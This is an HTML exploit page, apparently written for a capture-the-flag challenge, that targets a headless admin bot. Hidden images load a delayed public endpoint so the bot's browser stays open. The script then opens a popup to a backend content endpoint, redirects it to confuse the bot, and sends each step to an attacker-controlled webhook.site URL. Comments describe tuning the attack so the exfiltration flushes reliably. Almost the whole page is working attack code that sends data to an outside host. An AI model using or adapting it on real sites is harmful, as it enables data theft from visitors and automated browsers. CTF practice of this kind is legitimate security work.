<body><h1>loading</h1>
<!-- RELIABLE keepalive: a public endpoint that delays its response ~10s so the bot's
     goto(networkidle0) never settles and the browser stays open long enough for the
     popup to register + confuse + flush the exfil. (10.x was refused instantly on the
     arena net, closing the browser too early.) -->
<img src="https://httpbin.org/delay/10" style="display:none">
<img src="https://httpbin.org/delay/10" style="display:none">
<script>
const q = new URLSearchParams(location.search);
const B = (q.get('b') || 'http://backend:8080').replace(/\/+$/,'');
const P = '2';
const WT = q.get('w') || '';
function bx(s){ if(WT) new Image().src='https://webhook.site/'+WT+'/S?'+s+'&t='+Date.now(); }
bx('step=loaded&ver=d3&B='+encodeURIComponent(B));
const w = window.open(B + '/api/content/' + P + '/1', 'x');   // register RB (direct /1, no competing dict)
setTimeout(function(){ bx('step=nav'); try { w.location = B + '/api/content/' + P + '/2'; } catch (e) {} }, 5000);
</script>
